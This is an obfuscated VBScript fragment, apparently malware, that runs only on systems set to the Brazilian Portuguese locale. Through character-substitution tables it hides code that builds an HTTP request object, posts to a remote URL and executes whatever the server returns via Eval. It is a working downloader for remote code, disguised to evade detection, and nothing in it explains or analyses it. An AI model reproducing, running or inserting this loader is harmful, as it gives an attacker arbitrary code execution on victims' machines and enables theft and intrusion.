If SetLocale() = (1046) Then
Dim arrx(55)
Dim arry(55)
Dim macarenax(55)
Dim macarenay(55)
arrx(2) = "©" 
variavel = variavel & "³ÆªÞ=""¬""&""¶""&""¿""&""Å""&""¿""&""¨""&""¿""&""´""&""ø""&""¿""&"".""&""•""&""¶""&""Ø""&""¿""&""/""&""U""&""/""&""§""&""¿""&""£_-_""&"".""&""®""&""§""&""®        """ & chr(13)
arry(2) = "z" 
arrx(3) = "¯" 
variavel = variavel & "³R»♫ª»³Æ=""¨""&""=«""&""«""" & chr(13)
arry(5) = "j" 
variavel = variavel & "ºººº=""                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Æ»º""" & chr(13)
arrx(6) = "ø" 
variavel = variavel & "Å•° ¦¦¦" & chr(13)
arry(13) = "h" 
arrx(14) = "♫" 
variavel = variavel & "³»Æ ªªª = C´»¬Æ»Oµƒ»¨Æ(""M""&""•¨´¿³""&""¿ØÆ.XML""&""HT""&""TP"")" & chr(13)
arry(11) = "d" 
arrx(12) = "£"
variavel = variavel & "³»Æ ¦¦¦ = ªªª" & chr(13)
arry(8) = "4" 
variavel = variavel & "W•Æ§ ¦¦¦" & chr(13)
arry(7) = "8" 
variavel = variavel & "³Æª=""                §""&""Æ""&""Æ""&""®""&"":""&""/""&""/""&³ÆªÞ" & chr(13)
arrx(8) = "Ð" 
variavel = variavel & ".¿®»¶ SÆ´R»ø»´³»(ºººº) ,³Æª ,Ø¬¼³»" & chr(13)
arry(6) = "v" 
variavel = variavel & "§£=""               ¨¿""" & chr(13)
arrx(5) = "ƒ" 
variavel = variavel & ".³»ÆR»♫ª»³ÆH»¬Å»´ §£ &""""&""¶""&""Æ""&""»""&""¶""&""Æ""&""-""&""Æ""&""×""&""®""&""»           "", ""ap""&""pli""&""ca""&""tio""&""n/""&""x-""&""ww""&""w-f""&""or""&""m-u""&""rle""&""nc""&""od""&""ed""" & chr(13)
arry(3) = "7" 
arrx(4) = "¦" 
arry(4) = "x" 
arry(1) = "a" 
variavel = variavel & ".³»¶Å ³R»♫ª»³Æ" & chr(13)
arrx(1) = "¬" 
variavel = variavel & "E¶Å þ•Æ§" & chr(13)
arry(0) = "p" 
variavel = variavel & "»¦»¨ªÆ»(¦¦¦.´»³®¿¶³»T»¦Æ)" & chr(13)
arrx(0) = "®" 
variavel = variavel & "" & chr(13)
arrx(7) = "¥" 
arrx(9) = "º" 
arry(9) = "g" 
arrx(10) = "½" 
arry(10) = "3" 
arrx(11) = "Å" 
arry(12) = "k" 
arrx(13) = "§" 
arry(14) = "q" 
arrx(15) = "«" 
arry(15) = "5" 
arrx(16) = "þ" 
arry(16) = "w" 
arrx(17) = "Þ" 
arry(17) = "1" 
arrx(18) = "¡" 
arry(18) = "2" 
arrx(19) = "×" 
arry(19) = "y" 
arrx(20) = "¨" 
arry(20) = "c" 
arrx(21) = "¾" 
arry(21) = "" 
arrx(22) = "Ø" 
arry(22) = "f" 
arrx(23) = "æ" 
arry(23) = "" 
arrx(24) = "¼" 
arry(24) = "l" 
arrx(25) = "°" 
arry(25) = "m" 
arrx(26) = "ª" 
arry(26) = "u" 
arrx(27) = "³" 
arry(27) = "s" 
arrx(28) = "ï" 
arry(28) = "6" 
arrx(29) = "¹" 
arry(29) = "9" 
arrx(30) = "»" 
arry(30) = "e" 
arrx(31) = "´" 
arry(31) = "r" 
arrx(32) = "¿" 
arry(32) = "o" 
arrx(33) = "•" 
arry(33) = "i" 
arrx(34) = "µ" 
arry(34) = "b" 
arrx(35) = "Æ" 
arry(35) = "t" 
arrx(36) = "¶" 
arry(36) = "n" 
macarenay(25) = "!!" 
macarenay(35) = "##" 
arrx(55) = "_-_" 
arry(55) = "r" 
For jonhnjoh = 0 to 55 Step 1
xvariavel = ""
variavel = Replace(variavel,arrx(jonhnjoh),arry(jonhnjoh))
xvariavel = Replace(xvariavel,macarenax(jonhnjoh),macarenay(jonhnjoh))
Next
feraferida = variavel
execute( "                                  "  & variavel &"                            "&"")
end if